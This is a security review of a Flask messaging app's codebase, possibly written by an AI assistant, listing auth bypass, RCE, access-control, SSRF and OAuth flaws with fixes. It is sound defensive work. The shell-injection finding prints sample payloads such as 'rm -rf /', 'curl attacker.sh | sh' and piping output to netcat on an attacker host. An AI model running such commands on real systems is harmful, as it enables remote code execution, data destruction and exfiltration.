# Honest review

Short answer: **it's a large, ambitious codebase with a lot of working functionality, but it is not production-safe as-is.** There are at least four issues I'd classify as "actively exploitable" (auth bypass, RCE, broken access control), several SSRF/TLS/account-takeover vectors, and a lot of smaller correctness and performance problems. The bones are good — organized by domain, decorators for auth, rate-limit helpers, uploads with path normalization, `secrets` for tokens in most places. But the security layer has holes you'd need to close before letting real users in.

I'll go worst-first.

---

## 🔴 Critical — fix before anyone else can reach this

### 1. Complete auth bypass in `login_v3.py`
```python
@spav2_login_v3_bp.route('/login-otp-only', methods=['POST'])
def login_otp_only():
    data = request.get_json() or {}
    email = sanitize_string(data.get('email', '').strip().lower(), max_length=128)
    verified = data.get('otp_verified', False)   # ← CLIENT TRUSTS ITSELF
    if not verified:
        return ... OTP_REQUIRED ...
    user = User.query.filter_by(email=email, ...).first()
    session_token = _make_session(user)          # ← LOGGED IN
```
The client sends `{"email": "victim@example.com", "otp_verified": true}` and is logged in as the victim, **with no OTP needed at all**. `login_password` has the same flaw (`if not verified: return ...`) — OTP is entirely client-trusted.

`verify_otp` doesn't set any server-side state to prove the step actually ran. There's no session flag, no short-lived token, no DB column tracking it. **Anyone can log in as anyone.**

Fix: after `/verify-otp` succeeds, set `session['otp_verified_email'] = email` (or issue a one-time signed token). `login_password` / `login_otp_only` must read that, not a client-supplied boolean.

### 2. Email verification is a no-op in `auth.py`
```python
return jsonify({'success': True, 'data': {
    'user': {...},
    'verification_token': verify_token,   # ← returned to the caller
    'message': '...',
}})
```
You return the verification token in the registration response. So any client can immediately hit `/verify?token=<it>` and skip verification. Email is now decorative.

Also `register()` does `print(f'[EMAIL] Verification link: {verify_url}')` — the token lands in the logs too.

### 3. `admin.py` terminal is a full RCE — `shell=True` defeats the blocklist
```python
def _check_command(cmd):
    parts = shlex.split(cmd)          # shlex doesn't split on ; | & > < $ ` \
    base = parts[0].strip().lower()
    if base in DANGEROUS_CMDS: ...
    ...
result = subprocess.run(cmd, shell=True, ...)   # ← passed to /bin/sh
```
`_check_command` is meaningless because you run with `shell=True`. Examples that all pass the check and execute fully:

- `ls ; rm -rf /` → `shlex.split` → `['ls;', 'rm', '-rf', '/']`, `parts[0]='ls;'` not dangerous. Runs `ls` **and** `rm -rf /`.
- `ls && curl attacker.sh | sh`
- `ls $(curl evil.sh)` — command substitution
- `` ls `curl evil.sh` ``
- `ls | nc attacker 4444`

The `'>' in cmd` guard is also trivially bypassed (`2>&1`, `<<<`, `| tee`).

Fix: **don't run shell=True at all**. Use `shlex.split(cmd)` + `subprocess.run(argv, shell=False, ...)`. Add an explicit allowlist of binaries if you must run commands, or better — drop this feature entirely.

### 4. `features.py` — anyone can promote themselves to group admin
```python
@spav2_features_bp.route('/groups/<int:chat_id>/promote', methods=['POST'])
def promote_member(chat_id):
    data = request.get_json() or {}
    user_id = data.get('user_id')
    member = ChatMember.query.filter_by(chat_id=chat_id, user_id=user_id).first()
    if member and member.role != 'owner':
        member.role = 'admin'   # ← no check that the *requester* is an admin
```
`demote_member`, `remove_member`, `update_group`, `revoke_invite`, `get_group_invites` in the same file have **no permission checks at all**. Any authenticated user can:
- promote themselves to admin in any group (by passing their own `user_id`)
- demote or remove other admins
- change any group's name / description / `is_public`
- revoke any invite link
- read any group's invite list

### 5. Route collision — `groups.py` and `features.py` both own `/api/groups/<int>/update`
```python
# groups.py
@spav2_groups_bp.route('/groups/<int:group_id>/update', methods=['POST'])
def update_group(group_id): ...  # has owner/admin check

# features.py
@spav2_features_bp.route('/groups/<int:chat_id>/update', methods=['POST'])
def update_group(chat_id): ...   # NO permission check
```
Both blueprints are registered under `/api`. Flask will only route to the first matching rule — behavior depends on registration order (`features.py` loads before `groups.py` in `_load_bps`? Actually `groups.py` is earlier in the list, so `groups.py` wins today, but this is fragile: any reorder, or code that imports differently, turns this into an unauthenticated group-edit endpoint). **Delete the duplicate.**

---

## 🟠 High — data leaks and account takeover

### 6. `channels.py get_channel_messages` — no access check at all
```python
@spav2_channels_bp.route('/channel_messages/<int:channel_id>', methods=['GET'])
def get_channel_messages(channel_id):
    ...
    messages = Message.query.filter_by(chat_id=channel_id)...  # no check
```
Any authenticated user can read any channel's messages, private or not, if they can guess the integer ID. Compare with `groups.py:get_group_messages`, which does check `ChatMember`.

### 7. `sputnik.py sputnik_profile_media` — profile media leak
```python
q = Message.query.filter(
    ((Message.sender_id == user_id) | (Message.receiver_id == user_id)),
    Message.file_path.isnot(None), ...)
```
No check that the viewer is allowed to see `user_id`'s messages. Any logged-in user can list another user's private files by ID.

### 8. `sputnik.py _preview_fetch` — SSRF remains
The DNS/IP check runs **before** `urlopen`, but `urlopen` follows redirects by default. A server can respond with `302 Location: http://169.254.169.254/latest/meta-data/` and the private IP check is bypassed. Also:
- `.is_private` doesn't cover `is_link_local` (169.254.0.0/16), `is_reserved`, `is_multicast`, `is_loopback` on all platforms
- No IPv6 check on the outer host (only the resolved IPs, and it's checked for `is_private` — `::1` is caught, `fe80::/10` is not)
- No redirect limit

Fix: `urllib.request.build_opener(HTTPRedirectHandler_that_refuses_private, ...)`, and use `is_global` on the resolved IP.

### 9. `oauth.py` — account takeover via GitHub
```python
gh_info = resp.json()
if not gh_info.get('email'):
    emails = requests.get('/user/emails').json()
    primary = next((e for e in emails if e.get('primary')), None)
    if primary:
        gh_info['email'] = primary.get('email')   # ← not checked for `verified`
```
GitHub returns both verified and unverified emails from `/user/emails`. If you match on an unverified address, an attacker with any GitHub account can add `victim@example.com` to their account and take over the victim's Kiselgram account. Must filter `e['verified']`.

Also: `_find_or_create_user` links by email if it matches an existing user. That's intentional account linking, but only safe when the provider actually verified the address. Restrict linking to Google only (`email_verified` there is real), or require the user to be logged in to link, or use provider-specific non-email IDs.

### 10. `oauth.py` — `postMessage(data, '*')`
```js
window.opener.postMessage(data, '*');
```
`data` contains `session_token`. Any page that pops this callback can receive the token. Pass an explicit `window.opener` origin, not `*`.

Also the fallback sets `window.location.href = '/?oauth_result=' + JSON.stringify(data)` — the session token lands in the URL, browser history, and referer headers.

### 11. `features.py` — TLS verification disabled
```python
ctx = ssl._create_unverified_context()
urllib.request.urlopen(url, ...)      # in search_gifs
urllib.request.urlopen(url, ...)      # in translate_message
```
Both `search_gifs` and `translate_message` accept `MITM` on the wire. Also the Tenor API key is a well-known public test key; no rate limiting on either endpoint. Neither endpoint auth-checks the user (translate isn't even authenticated).

### 12. `features.py` polls
- `create_poll` — no check that `chat_id` belongs to the caller; you can drop polls into any chat you know the ID of.
- `vote_poll` — no access check either; anyone can vote in any poll.
- `vote_poll` for `is_multiple` polls: `existing.option_index = option_idx` — a user only ever has **one** vote row, so "multiple choice" only lets them switch their single vote. Feature is broken.

### 13. `features.py` mute is chat-wide
```python
chat.muted_until = ...
```
`muted_until` lives on the `Chat` row, not on the user's `ChatMember` / `ChatSubscriber`. One user muting a group mutes it for everyone. If you intended per-user mute, this needs a per-user column.

### 14. `sputnik.py sputnik_cloud_recover` — no lockout
```python
if account_locked(f'cloud-recover:{uid}'):  # ← missing
```
It calls `note_account_failure(...)` on failure but never checks `account_locked`. Brute-force on the recovery email matches.

### 15. `admin.py admin_login` — no rate limit, no lockout
```python
@spav2_admin_bp.route('/login', methods=['GET', 'POST'])
def admin_login():
    user = User.query.filter_by(username=username).first()
    if user and user.is_admin and user.check_password(password):
```
The admin login form is directly brute-forceable. Every other login endpoint uses `@rate_limit` + `@account_lockout` — this one uses neither.

### 16. `admin.py` hardcoded mailadmin secret
```python
MAILADMIN_KEY = 'admin-internal-secret-kisel'
```
Move to env; rotate.

---

## 🟡 Medium — correctness / performance / privacy

### 17. No CSRF anywhere
Session cookie is used, and every mutating endpoint accepts JSON without a CSRF token or `SameSite=Strict` cookie assumption you can see here. `SameSite=Lax` (Flask default) protects GET but not top-level form POSTs. A malicious page can `fetch('/api.v2/...', {method:'POST', credentials:'include'})` on the victim's behalf as long as the cookie is sent. `admin.py`'s HTML form login makes this worse: `admin_login` accepts form-encoded POST with no CSRF check.

### 18. Timezone chaos
`datetime.utcnow()` (naive) and `datetime.now(timezone.utc)` (aware) are mixed across every file. SQLAlchemy will happily store both; comparisons like `user.created_at > datetime.now(timezone.utc) - timedelta(...)` will raise `TypeError` when one side is aware and the other isn't. `admin_extras._reporter_stats` does exactly this:
```python
age_h = (datetime.utcnow() - u.created_at).total_seconds() / 3600
```
Fine if `created_at` is naive, TypeError if it's aware. Pick one convention (I'd suggest "always naive UTC" since that's the majority in your code) and enforce it.

`features.py schedule_message` is an example: `timestamp=datetime.now(timezone.utc)` (aware) but other files store naive. `sputnik_scheduled_list` then does `Message.scheduled_at > now` with `now = datetime.now(timezone.utc).replace(tzinfo=None)`, i.e. it filters against a naive value, and if `scheduled_at` was written aware (from `features.schedule_message`), the comparison errors or misbehaves.

### 19. `chat.py chat_list` loads all message history
```python
all_conv_msgs = Message.query.filter(
    ((Message.sender_id == current_user_id) & (Message.receiver_id != current_user_id)) |
    ((Message.receiver_id == current_user_id) & (Message.sender_id != current_user_id))
).order_by(Message.timestamp.desc()).all()
```
No `.limit()`. For a user with 100k messages, this is a 100k-row load per chat-list request, just to pick the latest message per peer. Use a window function or a `group_by`/`max` subquery (you already do this in `groups.py get_groups` — copy the pattern).

### 20. `sputnik.py sputnik_cleanup_orphans` — `NOT IN (huge list)`
```python
mids = [m.id for m in Message.query.with_entities(Message.id).all()]
orphans = model.query.filter(~model.message_id.in_(mids)).all()
```
`NOT IN (1, 2, 3, ... 100000)` gets progressively slower. Use `LEFT JOIN ... WHERE other.id IS NULL` (or `NOT EXISTS`) — SQLAlchemy supports both, and it scales.

### 21. `search.py search_in_chat` — no group membership check
```python
if chat_type == 'personal':
    ...
else:
    base_query = Message.query.filter_by(chat_id=chat_id_int)
```
For `chat_type != 'personal'`, any authed user can search any chat if they know the ID. Same pattern in `features.py search_by_date`. Both need a `_chat_access` check.

### 22. `chat.py` — typing status is per-worker
`_typing_status = {}` lives in module memory. Under gunicorn with N workers or multiple machines, a typist's status is only visible to whichever worker got their request. Either move to Redis/DB, or make the client poll a shared store.

### 23. `stories.py _require_premium` ignores expiry
```python
if not user or not (user.premium and user.premium.is_premium):
    return ... PREMIUM_REQUIRED
```
If a user's premium has expired but `is_premium` is still `True` (perhaps because you don't have a cron to flip it), they still post stories. Check `premium_expires_at > now()` too. `referrals.py` actually does compute expiry correctly, so you have the field.

### 24. `features.py` EMOJI_CATEGORIES is mojibake
The emoji literals are UTF-8 bytes that have been decoded as CP1251 (you can see `рҹҳҖ` where `😀` should be). Either the file was resaved in the wrong encoding, or it was pasted from a mis-decoded source. Clients will receive broken strings. Re-save the file as UTF-8 and use real emoji literals, or move to codepoints / names.

### 25. `features.py revoke_invite` / `get_group_invites` / `promote_member` etc. — permission issues already listed
Worth repeating because the pattern is the same: the route exists, takes chat_id, does its thing, but never checks that the caller is owner/admin.

### 26. `sputnik.py sputnik_sticker_from_message` — arbitrary file reference
```python
msg = Message.query.get(data.get('message_id'))
if not msg or not msg.file_path:
    return ...
s = SputnikSticker(owner_id=uid, file_path=msg.file_path, ...)
```
No check that the message is visible to `uid`. Any user can create stickers out of any message's file if they know the ID. Combined with a public group, that's a straightforward leak of media.

### 27. `stories.py delete_story` — path join on `media_path`
```python
full = os.path.join('uploads', story.media_path)
if os.path.exists(full):
    os.remove(full)
```
`media_path` is only ever set server-side for normal stories, so this is safe **today**. But `sputnik_story_replace` lets a user write `s.media_path = data['media_path']` (with a `'..' in mp` check). The check looks correct, but I'd feel more comfortable with:
```python
base = os.path.realpath('uploads')
full = os.path.realpath(os.path.join(base, story.media_path))
if not full.startswith(base + os.sep):
    abort(400)
```
Which is the same pattern you already use in `telegram.py tg_round_upload` and `sputnik.py sputnik_upload` — reuse it.

### 28. `stories.py reply_to_story` — creates self-chats
```python
a, b = sorted([current_user_id, story.user_id])
chat = Chat.query.filter_by(chat_type='personal', user1_id=a, user2_id=b).first()
```
If `current_user_id == story.user_id`, you get a `user1_id == user2_id` chat, which breaks the "personal chats are pairs" invariant used everywhere else. Guard: `if current_user_id == story.user_id: reject` or treat it as a "reply to self" with no chat.

### 29. `admin_extras.py activity_stream` — SSE holds a gunicorn worker forever
```python
while True:
    ...
    time.sleep(2)
```
Under gunicorn sync workers, this blocks a worker for the lifetime of the connection. With `--workers 4` and 5 open admin tabs, your entire backend is wedged. Use `gevent` / `eventlet` / a real async worker, or at least document it.

### 30. `admin_extras.py reports_grouped` — loads all pending reports
```python
rows = (Report.query.filter_by(status=status).order_by(...).all())
```
No pagination. Under a report flood this can OOM the admin endpoint. Paginate it.

### 31. `oauth.py _fetch_userinfo` never checks `resp.ok` / status
```python
resp = requests.get(cfg['userinfo_url'], headers=...)
if provider_name == 'github':
    gh_info = resp.json()               # ← could be {"error": "..."}
```
GitHub returns 401/403 with an error body on expired tokens. You'll pass that into `_find_or_create_user` and crash on `userinfo['provider_id']` (KeyError → 500 with `str(e)` leaking details). Add `resp.raise_for_status()`.

### 32. `login_v3._new_otp_code` uses `random`
```python
return str(random.randint(10000, 99999))
```
`random` is a Mersenne Twister, not a CSPRNG. `secrets.randbelow` is the right call for OTPs. Not a disaster alone (rate limits help), but it's a policy failure.

Also: the OTP is `logger.info`'d in every send path (`send_otp`, `send_otp_email`, `register_send_code`). Depending on your log retention, that defeats the purpose of OTP for 5 minutes.

### 33. `login_v3.register_finish` — `friend_verified` bypass
```python
if not email_verified:
    if not (friend_verified and ref_inviter and ref_inviter.username.lower() != (username or '').lower()):
        return VERIFY_REQUIRED
```
`friend_verified` is a body flag the client sends. So anyone can register with `friend_verified: true, ref: "someuser"` and skip email verification. If the intent is "someone vouches for you", it needs to be an invite token the *inviter* generates, not a client flag.

### 34. `admin_extras.py reports_bulk` — "ban" is actually soft-delete
```python
if action == 'ban_senders':
    ...
    u.is_deleted = True
    u.deleted_at = ...
```
Using `is_deleted` as "banned" means the user disappears from other queries (`User.is_deleted == False` is checked almost everywhere) — that's effectively account deletion, not a ban. If you want "banned", add a separate `is_banned` column. Right now `reports_bulk(ban_senders)` and `delete_user` produce the same state.

### 35. `admin.py list_reports` — N+1 inside a comprehension
```python
'reporter_username': users.get(r.reporter_id, User.query.get(r.reporter_id)).username if users.get(r.reporter_id) else None,
```
If the dict lookup misses, it calls `User.query.get()` inside the comprehension. For 50 reports this is up to 100 extra queries. Build the `users` dict for all `user_id`s present, then index it.

### 36. `sputnik.py sputnik_album_create` / `sputnik_round_send` / `sputnik_sticker_upload` — no file ownership check
These accept a client-provided `file_path` and store it. `sputnik_upload` is the only place that *creates* a path, and it doesn't hand back anything the client can attach ownership to. So any user can reference any upload path (including other users' stickers, round videos, etc.) by guessing the UUID. Add `owner_id` to a `File` table or an upload-session table, and validate the path belongs to the caller.

### 37. `referrals.py` — the "threshold" constant is dead
`REFERRAL_PREMIUM_THRESHOLD = 10` is reported to clients as `threshold: 10`, but the reward logic (`grant_referral_reward`) grants 30 days on **every** referral. So the threshold number shown to users is fictional. Either implement it (only reward at count % 10 == 0) or remove it — right now it's misleading.

### 38. `chat.py` — self-chat is created with `receiver_id == sender_id`, but nothing enforces it
`send_personal_message` allows `receiver_id == current_user_id` (it's a self-message, valid for Saved Messages), but it doesn't prevent someone from creating "personal" rows with `user1_id == user2_id` through other paths. Add a DB `CheckConstraint` (`Chat.user1_id != Chat.user2_id` when `chat_type='personal'`) or a `@validates` in SQLAlchemy.

---

## 🟢 What's actually good

Worth saying explicitly so the review isn't just a wall of red:

- **Structure**: separating `spav2` (v2 + v3 aliasing) into domain blueprints is clean. `Api2` class is a nice registration hook.
- **Decorators**: `@rate_limit`, `@account_lockout`, `@admin_required`, `@_guard` (in `_svc.py`) are all in the right place — you use them consistently in most files, which is why the missing ones stand out.
- **`_svc.py`** is genuinely well-done: HMAC-derived paths, `is_staff_path` middleware hook, CSRF token generation (though not verified — see below), `hmac.new` + `hashlib.sha256` for path minting is correct.
- **Uploads**: `telegram.tg_round_upload` and `sputnik.sputnik_upload` both use the `realpath` prefix check — that's the right pattern; just apply it everywhere.
- **`_resolve_chat_id`** in `sputnik.py` is a smart abstraction: "caller passes `chat_id`, or `chat_type` + `peer_id`, resolve, upsert `ChatMember`" — removes a ton of duplication.
- **`_preview_fetch`** at least *tried* SSRF protection — the intent is right, the implementation is incomplete.
- **`_svc._op_login`** returns a generic `'Неверный телефон'` / `'Неверный пароль'` — good (doesn't leak which is wrong). Compare to a lot of the rest of the code which returns `NOT_FOUND` for a user's email — that's a user enumeration vector, though rate-limited.
- **`referrals.grant_referral_reward`** correctly handles "premium expired but flag still true" — that's the one place I saw it done right.
- **`admin_extras._audit`** swallows errors on purpose (so a failed audit doesn't break the action) — deliberate, fine.
- **`admin_extras`** uses `selectinload` / batched lookups in a few places — good instinct, just apply it to `chat_list` and `list_reports` too.

---

## 📋 Concrete priority list

If you can only do 10 things this week:

1. **Fix `login_v3` OTP bypass.** Remove the client-trusted `otp_verified` flag. After `verify_otp`, set `session['otp_ok_for'] = email` and have `login_*` read that. (2 hours)
2. **Remove `verification_token` from `auth.register`'s response.** Email must be the only channel. (10 min)
3. **Rewrite `admin.terminal_exec`** with `shell=False`, `shlex.split`, argv allowlist. (1 hour)
4. **Add permission checks to `features.py`:** `promote_member`, `demote_member`, `remove_member`, `update_group`, `revoke_invite`, `get_group_invites`. Use the same `_group_owner_or_admin` helper you already have in `sputnik.py`. (1 hour)
5. **Fix `oauth.py` GitHub email:** filter for `verified`. And replace `postMessage(data, '*')` with an explicit origin. (1 hour)
6. **Delete the duplicate `/groups/<int>/update` route** in `features.py` (keep the `groups.py` one). (5 min)
7. **Add access checks to `channels.get_channel_messages`, `sputnik_profile_media`, `search.search_in_chat`, `features.search_by_date`.** (2 hours)
8. **Restrict `_preview_fetch`** to reject redirects and use `is_global`. (30 min)
9. **Remove `ssl._create_unverified_context()`** from `search_gifs` and `translate_message`. (5 min)
10. **Pick a timezone convention** (naive UTC is the majority) and grep for `now(timezone.utc)` vs `utcnow()`. Add a lint rule if you can. (2–3 hours)

Then in the next two weeks: CSRF on POST endpoints (drop Flask-WTF in or add a `@csrf_protect` decorator that checks `session['csrf_token']` — you already generate one in `_svc._op_page`), pagination in `chat_list`, lockouts on `admin_login` and `sputnik_cloud_recover`, OTP `secrets.randbelow`, and move `MAILADMIN_KEY` to env.

## One meta-note

The code has the shape of something written by someone who knows what "secure" looks like (bcrypt, `secrets`, `hmac`, `shlex`, `realpath`, `rate_limit`, `sanitize_string`, `account_lockout`) — the problem is that **the individual endpoints don't always apply the tools consistently**. The API surface is large enough that *one* missed check on *any* endpoint is a vulnerability, and there are several. I'd strongly suggest adding a small test suite that, for each mutating route, asserts (a) 401 without auth, (b) 403 with a wrong-role user, (c) 200 with the right role. You'd catch ~80% of the issues in this review with that harness alone.